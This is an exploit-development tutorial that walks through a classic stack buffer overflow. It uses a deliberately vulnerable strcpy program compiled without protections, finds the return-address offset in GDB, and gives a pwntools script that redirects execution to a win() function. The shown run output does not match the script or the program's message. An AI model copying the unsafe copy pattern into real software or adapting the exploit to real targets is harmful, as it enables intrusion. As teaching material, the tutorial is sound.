# Stack Buffer Overflow & Control Flow Hijacking
In this page we're going to learn how to exploit a stack buffer overflow in order to control the program execution flow :):)

## Architecture Review
The stack grows from high memory addresses to low memory addresses. When a function is called, a dedicated Stack Frame is allocated.

### Stack Layout (32-bit x86)
```text
+------------------------------------+  <-- High Address
|  Arguments passed to function      |
+------------------------------------+
|  Saved EIP (Return Address)        |  <-- Target for hijacking
+------------------------------------+
|  Saved EBP (Old Base Pointer)      |
+------------------------------------+  <-- Current EBP points here
|                                    |
|  Local Variables (Buffers)         |  <-- Writes flow upward (toward high addresses)
|                                    |
+------------------------------------+  <-- Current ESP points here (Low Address)

```

### Function Prologue & Epilogue

The compiler automatically inserts assembly routines to manage the stack transitions.

**Prologue:**

```assembly
push ebp      ; Save previous base pointer
mov ebp, esp  ; Set current stack pointer as the new base
sub esp, 0x20 ; Allocate space for local variables

```

**Epilogue:**

```assembly
mov esp, ebp  ; Restore stack pointer (destroy local variables)
pop ebp       ; Restore old base pointer
ret           ; Pop Saved EIP from stack and jump to it

```

---

## Vulnerable Code (`vuln.c`)

The following C code utilizes `strcpy`, which performs unbounded string copying into a fixed-size buffer.

```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("Control hijacked! Successfully executed win()!\n");
}

void vulnerable_function(char *str) {
    char buffer[64];
    strcpy(buffer, str); 
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}

```

### Compilation (No Mitigations)

To analyze the raw bug without compiler defenses, compile with stack cookies and PIE disabled:

```bash
gcc -m32 -fno-stack-protector -no-pie -fno-pie vuln.c -o vuln

```

---

## Exploit Development Walkthrough

### 1. Locate Target Function Address

Open the binary in GDB to extract the static memory address of the target function.

```text
$ gdb ./vuln
gef➤  print win
$1 = {void (void)} 0x80484cb <win>

```

### 2. Determine Crash Offset

Because of compiler alignment and padding, the actual distance to the Saved EIP can be larger than the buffer size. Use a cyclic pattern to find the exact offset.

```text
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

```

The application will crash trying to return to the pattern-overwritten Saved EIP:

```text
Invalid DWORD instruction pointer: 0x61616174 ("taaa")

gef➤  pattern offset taaa
[+] Found at offset 76

```

The layout required to hijack control flow is:
`[76 Bytes of Junk] + [4 Bytes of Target Address]`

---

## Automated Exploit (`exploit.py`)

```python
#!/usr/bin/env python3
from pwn import *

context.update(arch='i386', os='linux')

binary_path = './vuln'
offset = 76
target_address = 0x080484cb # The adress of the win function we found before

payload = b"A" * offset + p32(target_address)

p = process([binary_path, payload])

output = p.recvall().decode('utf-8', errors='ignore')
print(output)
```

And the result is as expected:
```
(.venv) homigrotas@homi:~$ python3 exploit.py 
[*] Sending payload of length 80...
[+] Starting local process './vuln': pid 15771
[+] Receiving all data: Done (72B)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 15771)
מחזיר שליטה! הצלחת להריץ את פונקציית win!
```
Congrats! We completed our first BOF :)